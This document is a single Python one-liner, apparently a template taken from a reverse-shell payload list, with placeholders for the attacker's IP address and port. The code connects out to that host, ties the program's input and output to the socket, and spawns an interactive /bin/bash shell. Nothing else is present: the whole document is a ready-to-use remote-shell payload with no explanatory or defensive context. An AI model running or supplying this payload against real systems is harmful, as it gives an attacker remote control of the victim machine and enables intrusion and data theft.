python -c \'import os;import pty;import socket;lhost="{ip}";lport={port};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((lhost,lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close();\'